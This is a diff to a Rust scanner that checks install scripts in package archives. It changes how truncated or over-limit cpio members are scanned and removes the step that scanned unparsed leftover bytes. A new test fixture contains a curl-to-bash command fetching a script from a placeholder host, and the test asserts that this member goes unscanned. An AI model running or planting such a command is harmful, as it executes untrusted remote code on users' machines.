@@ -164,18 +164,13 @@ fn scan_scripts_entry(
         findings.scan(label, archive_bytes, "install scripts (unparsed)");
         return Err(RuleOutcome::NotApplicable);
     };
-    // Members that did parse, and the bytes after a halt, are scanned even
-    // when the archive is cut short.
+    // Members that did parse, plus one cut off mid-body, are scanned even
+    // when the archive is incomplete.
     let complete = members.is_complete() && gap.is_none();
-    if !members.unparsed.is_empty() {
-        findings.scan(
-            label,
-            members.unparsed.to_vec(),
-            "install scripts (unparsed)",
-        );
-    }
 
-    for member in &members.entries {
+    let parsed = members.entries.iter().map(|m| (m, ""));
+    let cut = members.cut_short.iter().map(|m| (m, " (cut short)"));
+    for (member, note) in parsed.chain(cut) {
         if !member.is_regular_file() || member.data.is_empty() {
             continue;
         }
@@ -183,7 +178,7 @@ fn scan_scripts_entry(
         findings.scan(
             label,
             member.data.to_vec(),
-            &format!("install script {}", member.name),
+            &format!("install script {}{note}", member.name),
         );
     }
     if complete {
@@ -1456,11 +1451,54 @@ mod tests {
             .expect("evaluates")
             .expect("the decoded prefix scores");
         assert!(
-            signal.description.contains("install scripts (unparsed)"),
+            signal
+                .description
+                .contains("install script preinstall (cut short)"),
             "{}",
             signal.description
         );
         assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// One odc cpio member (regular file, mode 0644).
+    fn odc_member(name: &str, body: &[u8]) -> Vec<u8> {
+        let mut v = format!(
+            "070707{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:011o}{:06o}{:011o}",
+            0,
+            0,
+            0o100644,
+            0,
+            0,
+            1,
+            0,
+            0,
+            name.len() + 1,
+            body.len()
+        )
+        .into_bytes();
+        v.extend_from_slice(name.as_bytes());
+        v.push(0);
+        v.extend_from_slice(body);
+        v
+    }
+
+    /// A walk halted by the entry limit scans only the members it parsed.
+    #[test]
+    fn members_past_the_entry_limit_are_not_scanned() {
+        let mut cpio = Vec::new();
+        for i in 0..cpio::CpioLimits::default().max_entries {
+            cpio.extend(odc_member(&format!("f{i}"), b"echo hi\n"));
+        }
+        cpio.extend(odc_member(
+            "late",
+            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
+        ));
+
+        let c = ctx("s.pkg", &pkg_with_scripts(&cpio));
+        assert!(matches!(
+            InstallerScriptRule.evaluate(&c),
+            Err(RuleOutcome::NotApplicable)
+        ));
     }
 
     /// A gzip header, one decoded byte, then an invalid DEFLATE symbol,
